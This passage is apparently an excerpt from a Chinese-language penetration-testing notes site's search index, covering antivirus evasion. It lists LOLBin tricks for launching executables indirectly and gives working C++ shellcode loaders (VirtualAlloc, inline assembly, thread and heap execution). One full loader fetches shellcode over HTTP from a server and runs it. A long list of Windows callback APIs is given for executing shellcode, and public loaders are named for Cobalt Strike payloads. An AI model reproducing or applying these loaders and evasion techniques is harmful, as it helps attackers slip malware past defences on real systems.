\u524d\u9762\u7684\u8bdd:\u201d\u514d\u6740\u4e00\u822c\u90fd\u662f\u9760\u7ec4\u5408\u62f3\u201d","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#exe","text":"","title":"EXE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_3","text":"\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u3002\u53ef\u4ee5\u81ea\u5199\u52a0\u58f3\u5668\u7b49\u7b49","title":"\u52a0\u58f3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_4","text":"\u4e0d\u540c\u7684\u6740\u8f6f\u5bf9\u6570\u5b57\u7b7e\u540d\u7684\u654f\u611f\u6027\u4e0d\u540c\uff0c\u6709\u4e9b\u6740\u8f6f\u53ef\u80fd\u53ea\u68c0\u67e5\u4e00\u4e0b\u6709\u6ca1\u6709\u6570\u5b57\u7b7e\u540d\u5c31\u8fc7\u4e86\uff0c\u6709\u4e9b\u6740\u8f6f\u53ef\u80fd\u8981\u53bb\u9a8c\u8bc1\u4e00\u4e0b\u6570\u5b57\u7b7e\u540d\u7684\u6b63\u786e\u6027\uff0c\u6709\u4e9b\u53ef\u80fd\u7ba1\u90fd\u4e0d\u7ba1\u6570\u5b57\u7b7e\u540d\u3002\u53ea\u80fd\u8bf4\u6dfb\u52a0\u6570\u5b57\u7b7e\u540d\u80fd\u7a0d\u5fae\u63d0\u5347\u4e00\u4e0bexe\u7684\u514d\u6740\u51e0\u7387\u3002","title":"\u6dfb\u52a0\u6570\u5b57\u7b7e\u540d"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#exe_1","text":"\u5e73\u65f6\u6211\u4eec\u8fd0\u884c\u4e00\u4e2aexe\uff1a cmd /c c:\\a.exe \u4f46\u8fd9\u6837\u5bb9\u6613\u88ab\u6740\u6216\u8005\u547d\u4ee4\u88abban\u3002\u6240\u6709\u5c31\u6709\u4e00\u4e9b\u95f4\u63a5\u8fd0\u884cexe\u7684\u65b9\u6cd5","title":"\u95f4\u63a5\u8fd0\u884cexe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#forfiles","text":"forfiles\u662f\u4e00\u4e2a\u7528\u4e8e\u6279\u5904\u7406\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u5b83\u5728\u627e\u5230\u6587\u4ef6\u540e\u4f1a\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4. forfiles /p \u6307\u5b9a\u641c\u7d22\u6587\u4ef6\u7684\u76ee\u5f55 /m \u6307\u5b9a\u641c\u7d22\u5173\u952e\u8bcd /c \u6307\u5b9a\u8981\u6267\u884c\u7684\u547d\u4ee4 forfiles /p c:\\windows\\system32 /m calc.exe /c c:\\tmp\\evil.exe //evil.exe\u4f1a\u6210\u4e3aforfiles.exe\u7684\u5b50\u8fdb\u7a0b","title":"forfiles"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#pcalua","text":"pcalua -a c:\\tmp\\evil.exe //evil.exe\u4e0d\u4f1a\u6210\u4e3a\u5b50\u8fdb\u7a0b","title":"pcalua"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#cmd-hijack","text":"\u4e0b\u9762\u547d\u4ee4\u5c06\u5f39\u8ba1\u7b97\u5668 cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../../windows/system32/calc.exe\" cmd.exe /c \"ping ;a.exe; 127.0.0.1/../../../../../../../../../windows/system32/calc.exe\" ping ;a.exe 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe","title":"cmd Hijack"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#conhost","text":"\u5927\u4e8ewin7\u53ef\u7528 conhost c:\\windows\\system32\\calc.exe conhost adsadas/../../../../../../../../../windows/system32/calc.exe \u4ee5\u4e0b\u6307\u4ee4win10\u67d0\u4e9b\u7248\u672c\u65e0\u6cd5\u4f7f\u7528 conhost \"asddas c:\\windows\\system32\\calc.exe\"","title":"conhost"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#explorerexe","text":"explorer.exe c:\\windows\\system32\\calc.exe explorer asdsadasd,\"c:\\windows\\system32\\calc.exe\"","title":"explorer.exe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#c","text":"","title":"C++"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode","text":"","title":"shellcode\u5904\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_1","text":"\u9996\u5148\u4ececobalt strike\u4e0a\u751f\u6210\u62ff\u5230shellcode\u7528\u4f5c\u672c\u6b21\u6d4b\u8bd5\u3002 \u7136\u540e\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u76f4\u63a5\u6267\u884c\u5199\u6b7b\u5728\u7a0b\u5e8f\u91cc\u7684shellcode\u3002 #include <iostream> #include<Windows.h> int main() { unsigned char buf[] = \"shellcode\"; void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); ((void(*)())exec)(); return 0; } \u53ef\u4ee5\u770b\u89c1\uff0c\u8fd8\u662f\u5f88\u62c9\u8de8\u7684\u3002","title":"\u6307\u9488\u6267\u884c+\u7533\u8bf7\u5185\u5b58\u52a8\u6001\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_2","text":"c++\u6709\u5f3a\u5927\u7684\u5185\u8054\u6c47\u7f16\u529f\u80fd\uff0c\u4e0a\u6b21\u5199\u58f3\u7684\u65f6\u5019\u5c31\u611f\u53d7\u4e86\u4e00\u756a\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5185\u8054\u6c47\u7f16\u4ee3\u7801\u52a0\u8f7dshellcode.\u987a\u4fbf\u52a0\u82b1\u4ec0\u4e48\u7684\uff0c\u90fd\u53ef\u4ee5\u5f04\u3002 #include <iostream> #include<Windows.h> #include<winhttp.h> #pragma comment(lib, \"winhttp.lib\") #pragma comment(lib,\"user32.lib\") int main() { unsigned char buf[] = \"shellcode\"; _asm { lea eax, buf; jmp eax; } } \u8fd8\u662f\u86ee\u62c9\u8de8\u7684\uff0c\u867d\u7136\u6211\u6ca1\u6709\u52a0\u82b1\u3002","title":"\u5185\u8054\u6c47\u7f16\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_3","text":"unsigned char buf[] = \"shellcode\"; void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); DWORD dwThreadId = 0; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)exec, NULL, NULL, &dwThreadId); WaitForSingleObject(hThread, INFINITE);","title":"\u521b\u5efa\u7ebf\u7a0b\u6267\u884cshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_4","text":"heapcreate \u53ef\u4ee5\u521b\u5efa\u8f85\u52a9\u5806\u6808\u5e76\u8bbe\u7f6e\u5806\u6808\u5c5e\u6027\uff0c\u7136\u540e\u7528heapalloc\u5206\u914d\u5806\u6808\u5927\u5c0f char shellcode[] = \"\"; HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0); PVOID Mptr = HeapAlloc(hHep, 0, sizeof(shellcode)); RtlCopyMemory(Mptr, shellcode, sizeof(shellcode)); //\u7136\u540e\u5c31\u662f\u5bf9Mptr\u8fd9\u6bb5\u533a\u57df\u8fdb\u884c\u6267\u884c\uff0c\u5982((void(*)())exec)()\u6216\u521b\u5efa\u7ebf\u7a0b\u6267\u884c\u7b49","title":"\u4f7f\u7528\u8f85\u52a9\u5806\u6808\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#httpshellcode","text":"\u8fd9\u6b21\u6211\u4eec\u4e0d\u628ashellcode\u5199\u6b7b\u5728\u7a0b\u5e8f\u4e4b\u4e2d\uff0c\u800c\u662f\u901a\u8fc7\u7a0b\u5e8f\u53d1\u8d77http\u8bf7\u6c42\u5411\u5916\u754c\u83b7\u5f97shellcode\u5e76\u6267\u884c\u3002 \u8fd9\u91cc\u6d89\u53ca\u5230winhttp.h\u7684\u4e00\u4e9b\u51fd\u6570\u7684\u4f7f\u7528\u3002 \u6e90\u7801\u501f\u7528\u4e00\u4e0b \u537f \u7684\u4ee3\u7801\u3002\u5b83\u7684\u4ee3\u7801\u662f\u76f4\u63a5\u628ashellcode\u7684\u5341\u516d\u8fdb\u5236\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u76f4\u63a5\u653e\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u3002\u50cf\u8fd9\u6837 #include <string> #include <iostream> #include <windows.h> #include <winhttp.h> #pragma comment(lib,\"winhttp.lib\") #pragma comment(lib,\"user32.lib\") using namespace std; void main() { DWORD dwSize = 0; DWORD dwDownloaded = 0; LPSTR pszOutBuffer = NULL; HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL; BOOL bResults = FALSE; hSession = WinHttpOpen(L\"User-Agent\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); if (hSession) { hConnect = WinHttpConnect(hSession, L\"127.0.0.1\", INTERNET_DEFAULT_HTTP_PORT, 0); } if (hConnect) { hRequest = WinHttpOpenRequest(hConnect, L\"POST\", L\"qing.txt\", L\"HTTP/1.1\", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); } LPCWSTR header = L\"Content-type: application/x-www-form-urlencoded/r/n\"; SIZE_T len = lstrlenW(header); WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD); if (hRequest) { std::string data = \"name=host&sign=xx11sad\"; const void *ss = (const char *)data.c_str(); bResults = WinHttpSendRequest(hRequest, 0, 0, const_cast<void *>(ss), data.length(), data.length(), 0); ////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ); } if (bResults) { bResults = WinHttpReceiveResponse(hRequest, NULL); } if (bResults) { do { // Check for available data. dwSize = 0; if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) { printf(\"Error %u in WinHttpQueryDataAvailable.\\n\", GetLastError()); break; } if (!dwSize) break; pszOutBuffer = new char[dwSize + 1]; if (!pszOutBuffer) { printf(\"Out of memory\\n\"); break; } ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) { printf(\"Error %u in WinHttpReadData.\\n\", GetLastError()); } else { printf(\"ok\"); } //char ShellCode[1024]; int code_length = strlen(pszOutBuffer); char* ShellCode = (char*)calloc(code_length /2 , sizeof(unsigned char)); for (size_t count = 0; count < code_length / 2; count++){ sscanf(pszOutBuffer, \"%2hhx\", &ShellCode[count]); pszOutBuffer += 2; } printf(\"%s\", ShellCode); //strcpy(ShellCode,pszOutBuffer); void *exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, ShellCode, sizeof ShellCode); ((void(*)())exec)(); delete[] pszOutBuffer; if (!dwDownloaded) break; } while (dwSize > 0); } if (hRequest) WinHttpCloseHandle(hRequest); if (hConnect) WinHttpCloseHandle(hConnect); if (hSession) WinHttpCloseHandle(hSession); system(\"pause\"); } \u5927\u81f4\u6d41\u7a0b\u4fbf\u662f: 1.\u901a\u8fc7winhttp\u4e2d\u7684\u51fd\u6570\uff0c\u4ee5HTTP\u7684\u65b9\u6cd5\u83b7\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684shellcode\uff08\u6b64\u65f6shellcode\u5728\u5185\u5b58\u4e2d\u662f\u6309\u7167\u7f16\u7801\u7ed3\u679c\u5b58\u50a8\u7684\uff0c\u5982\u4e0b\u56fe\uff0c\u5de6\u8fb9\u662f\u5185\u5b58\u539f\u6587\uff0c\u53f3\u8fb9\u662f\u5185\u5b58\u89e3\u7801\uff08shellcode\uff09\uff09 2.\u5f00\u8f9f\u4e00\u6bb5\u5185\u5b58\uff0c\u7136\u540e\u901a\u8fc7sscanf\u7b49\u65b9\u6cd5\u8bfb\u53d6\u5b58\u50a8shellcode\u53d8\u91cf\u7684\u5185\u5bb9\uff0c\u5c06\u5185\u5b58\u89e3\u7801\u4fe1\u606f\u5f55\u5165\u65b0\u7684\u5185\u5b58\u7a7a\u95f4,\u4f7fshellcode\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d 3.\u6267\u884cshellcode\uff0c\u53ef\u4ee5\u7528\u6307\u9488\u6267\u884c\u7b49\u65b9\u6cd5\u6267\u884c\u3002","title":"HTTP\u534f\u8bae\u8fdc\u7a0b\u8bfb\u53d6shellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_5","text":"windows API\u4e2d\u6709\u5f88\u591a\u652f\u6301\u56de\u8c03\u51fd\u6570\u7684API\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u6b64\u7c7bAPI\u5e76\u5728\u7528\u4f5c\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u4e2d\u4f20\u5165shellcode\uff0c\u5728API\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u540e\u4fbf\u4f1a\u6267\u884c\u5b83\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5bf9\u4e8e\u6211\u4eec\u5c31\u662f\u8bf4\u6267\u884c\u6211\u4eec\u7684shellcode\u3002 \u4e3e\u51e0\u4e2a\u4f8b\u5b50 sc\u662f\u6307\u5411shellcode\u533a\u57df\u7684\u6307\u9488 EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)sc, LGRPID_INSTALLED, NULL); ImmEnumInputContext(0, (IMCENUMPROC)sc, 1); \u4e5f\u633a\u597d\u627e\u7684\uff0c\u5728\u5fae\u8f6f\u6587\u6863\u4e0a\u76f4\u63a5\u641cCALLBACK\u5c31\u80fd\u641c\u5230\u4e00\u5927\u5806\u56de\u8c03\u51fd\u6570\u3002 \u6211\u5728ropgadget\u535a\u5ba2\u4e0a\u4e5f\u5ad6\u5230\u4e86\u4e00\u4e9b\u3002 AddClusterNode BluetoothRegisterForAuthentication CMTranslateRGBsExt CallWindowProcA CallWindowProcW CreateCluster CreateDialogIndirectParamA CreateDialogIndirectParamW CreateDialogParamA CreateDialogParamW CreatePrintAsyncNotifyChannel CreateTimerQueueTimer DavRegisterAuthCallback DbgHelpCreateUserDump DbgHelpCreateUserDumpW DdeInitializeA DdeInitializeW DestroyCluster DialogBoxIndirectParamA DialogBoxIndirectParamW DialogBoxParamA DialogBoxParamW DirectSoundCaptureEnumerateA DirectSoundCaptureEnumerateW DirectSoundEnumerateA DirectSoundEnumerateW DrawStateA DrawStateW EnumCalendarInfoA EnumCalendarInfoW EnumChildWindows EnumDateFormatsA EnumDateFormatsW EnumDesktopWindows EnumDesktopsA EnumDesktopsW EnumEnhMetaFile EnumFontFamiliesA EnumFontFamiliesExA EnumFontFamiliesExW EnumFontFamiliesW EnumFontsA EnumFontsW EnumICMProfilesA EnumICMProfilesW EnumLanguageGroupLocalesA EnumLanguageGroupLocalesW EnumMetaFile EnumObjects EnumPropsExA EnumPropsExW EnumPwrSchemes EnumResourceLanguagesA EnumResourceLanguagesExA EnumResourceLanguagesExW EnumResourceLanguagesW EnumResourceNamesA EnumResourceNamesExA EnumResourceNamesExW EnumResourceNamesW EnumResourceTypesA EnumResourceTypesW EnumResourceTypesExA EnumResourceTypesExW EnumResourceTypesW EnumSystemCodePagesA EnumSystemCodePagesW EnumSystemLanguageGroupsA EnumSystemLanguageGroupsW EnumSystemLocalesA EnumSystemLocalesW EnumThreadWindows EnumTimeFormatsA EnumTimeFormatsW EnumUILanguagesA EnumUILanguagesW EnumWindowStationsA EnumWindowStationsW EnumWindows EnumerateLoadedModules EnumerateLoadedModulesEx EnumerateLoadedModulesExW EventRegister GetApplicationRecoveryCallback GrayStringA GrayStringW KsCreateFilterFactory KsMoveIrpsOnCancelableQueue KsStreamPointerClone KsStreamPointerScheduleTimeout LineDDA MFBeginRegisterWorkQueueWithMMCSS MFBeginUnregisterWorkQueueWithMMCSS MFPCreateMediaPlayer MQReceiveMessage MQReceiveMessageByLookupId NotifyIpInterfaceChange NotifyStableUnicastIpAddressTable NotifyTeredoPortChange NotifyUnicastIpAddressChange PerfStartProvider PlaExtractCabinet ReadEncryptedFileRaw RegisterApplicationRecoveryCallback RegisterForPrintAsyncNotifications RegisterServiceCtrlHandlerExA RegisterServiceCtrlHandlerExW RegisterWaitForSingleObject RegisterWaitForSingleObjectEx SHCreateThread SHCreateThreadWithHandle SendMessageCallbackA SendMessageCallbackW SetTimerQueueTimer SetWinEventHook SetWindowsHookExA SetWindowsHookExW SetupDiRegisterDeviceInfo SymEnumLines SymEnumLinesW SymEnumProcesses SymEnumSourceLines SymEnumSourceLinesW SymEnumSymbols SymEnumSymbolsForAddr SymEnumSymbolsForAddrW SymEnumSymbolsW SymEnumTypes SymEnumTypesByName SymEnumTypesByNameW SymEnumTypesW SymEnumerateModules SymEnumerateModules64 SymEnumerateSymbols SymEnumerateSymbols64 SymEnumerateSymbolsW SymSearch SymSearchW TranslateBitmapBits WPUQueryBlockingCallback WdsCliTransferFile WdsCliTransferImage WinBioCaptureSampleWithCallback WinBioEnrollCaptureWithCallback WinBioIdentifyWithCallback WinBioLocateSensorWithCallback WinBioRegisterEventMonitor WinBioVerifyWithCallback WlanRegisterNotification WriteEncryptedFileRaw WsPullBytes WsPushBytes WsReadEnvelopeStart WsRegisterOperationForCancel WsWriteEnvelopeStart mciSetYieldProc midiInOpen midiOutOpen mixerOpen mmioInstallIOProcA mmioInstallIOProcW waveInOpen waveOutOpen","title":"\u4f7f\u7528\u56de\u8c03\u51fd\u6570\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_6","text":"","title":"\u4f7f\u7528\u52a0\u8f7d\u5668\u52a0\u8f7dshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_-launcher","text":"https://github.com/clinicallyinane/shellcode_launcher/ \u7528msf\u6216\u8005cs\u751f\u6210raw\u5f62\u5f0fshellcode\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e2a\u52a0\u8f7d\u5668\u52a0\u8f7d\u4e00\u4e0b\u5c31\u884c\u4e86. \u50cf\u8fd9\u6837 shellcode_launcher.exe -i C:\\payload32.bin shellcode_ launcher \u5728virustotal\u4e0a\u62a5\u6bd2\u7387\u4e5f\u662f\u5f88\u9ad8\u5f88\u9ad8\u4e86\u2026","title":"shellcode_ launcher \u52a0\u8f7d\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#ssi","text":"https://github.com/DimopoulosElias/SimpleShellcodeInjector cs\u751f\u6210c\u5f62\u5f0fshellcode\uff0c\u7136\u540e\u53bb\u9664\\x\uff0c\u518d\u62ff\u7ed9ssi\u52a0\u8f7d\u5668\u52a0\u8f7d,\u50cf\u8fd9\u6837 ssi.exe shellcode \u5373\u53ef\u5b8c\u6210\u52a0\u8f7d ssi\u5728virustotal\u4e0a\u62a5\u6bd2\u7387\u4e5f\u662f\u975e\u5e38\u9ad8..","title":"SSI 